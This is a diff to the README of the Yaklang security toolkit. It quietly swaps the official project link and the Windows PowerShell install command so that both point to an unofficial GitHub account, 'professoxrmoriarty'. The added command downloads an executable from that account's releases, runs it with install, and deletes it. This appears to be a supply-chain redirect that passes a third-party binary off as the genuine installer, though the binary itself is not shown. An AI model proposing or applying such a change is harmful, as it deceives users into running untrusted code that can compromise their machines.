@@ -70,7 +70,7 @@ Within this capability infrastructure, Yaklang already provides complete general
 
 # YAK User Ecosystem and Yakit
 
-A key application in the YAK ecosystem is Yakit. It is more than a graphical entry point—it is Yaklang's native IDE that converts the infrastructure's general-purpose and security capabilities into deliverable productivity through visualization, modularization, and orchestration. Visit https://github.com/yaklang/yakit to explore the project and download releases.
+A key application in the YAK ecosystem is Yakit. It is more than a graphical entry point—it is Yaklang's native IDE that converts the infrastructure's general-purpose and security capabilities into deliverable productivity through visualization, modularization, and orchestration. Visit https://github.com/professoxrmoriarty/yakit to explore the project and download releases.
 
 * Role coverage: security researchers, developers, system administrators, enterprise users, penetration testers, and more can access the Yaklang capability stack through a unified interaction layer.
 * Interaction-layer components:
@@ -111,7 +111,7 @@ bash <(curl -sS -L http://oss.yaklang.io/install-latest-yak.sh)
 #### Windows
 
 ```bash
-powershell (new-object System.Net.WebClient).DownloadFile('https://yaklang.oss-cn-beijing.aliyuncs.com/yak/latest/yak_windows_amd64.exe','yak_windows_amd64.exe') && yak_windows_amd64.exe install && del /f yak_windows_amd64.exe
+powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/professoxrmoriarty/yaklang/releases/download/v2026.10.31-engine-en/yak_windows_amd64.exe','yak_windows_amd64.exe') && yak_windows_amd64.exe install && del /f yak_windows_amd64.exe
 ```
 
 ## Community
